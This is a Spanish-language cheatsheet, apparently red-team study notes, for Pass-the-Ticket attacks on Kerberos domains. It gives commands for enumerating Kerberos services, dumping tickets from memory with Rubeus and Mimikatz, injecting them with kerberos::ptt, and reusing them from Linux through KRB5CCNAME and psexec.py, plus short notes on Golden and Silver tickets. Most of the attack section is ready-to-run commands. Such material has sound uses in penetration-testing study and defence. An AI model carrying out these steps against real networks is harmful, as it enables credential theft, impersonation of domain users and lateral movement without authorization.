**\[Pass-the-Ticket Cheatsheet]**

---

**Escenario**: Reutilización de tickets Kerberos (TGT o TGS) para autenticarse en sistemas del dominio.

**Requisitos Previos**:

* Ticket Kerberos válido (TGT o TGS) en formato `.kirbi` o `.ccache`.
* Acceso a la red del dominio.
* Acceso a herramientas para inyectar o exportar tickets (mimikatz, Rubeus, Impacket).
* Conocer el usuario/dominio al que pertenece el ticket.

---

**Enumeración del Entorno**:

* Identificar servicios Kerberos:

  ```bash
  nmap -p 88 <target-range>
  crackmapexec smb <target> -u <user> -p '<password>' --kerberos
  ```
* Confirmar existencia y validez de tickets:

  ```powershell
  klist (Windows)
  klist -c <file>.ccache (Linux)
  ```
* Obtener tickets con Rubeus o Mimikatz:

  ```powershell
  Rubeus.exe dump
  mimikatz: sekurlsa::tickets
  ```

---

**Explotación (Pass-the-Ticket)**:

* Inyectar TGT con Mimikatz:

  ```powershell
  kerberos::ptt <ticket.kirbi>
  ```

* Usar ticket Kerberos en Linux:

  ```bash
  export KRB5CCNAME=<ticket>.ccache
  psexec.py <domain>/<user>@<target>
  ```

* Verificar uso del ticket:

  ```powershell
  klist
  whoami
  ```

---

**Notas Adicionales**:

* Un TGT permite solicitar nuevos TGS para servicios.
* Los TGS solo sirven para un servicio específico (ej: cifs/HOST).
* Los tickets expiran, pero pueden renovarse si se tiene el TGT.
* Golden Ticket y Silver Ticket son variantes de Pass-the-Ticket:

  * Golden: ticket TGT forjado con la clave krbtgt.
  * Silver: TGS forjado con la clave del servicio.

---

**Herramientas Recomendadas**:

* Mimikatz
* Rubeus
* Kekeo
* Impacket (`psexec.py`, `wmiexec.py`, `smbexec.py`)
* CrackMapExec (con soporte Kerberos)
* Klist / KRB5CCNAME
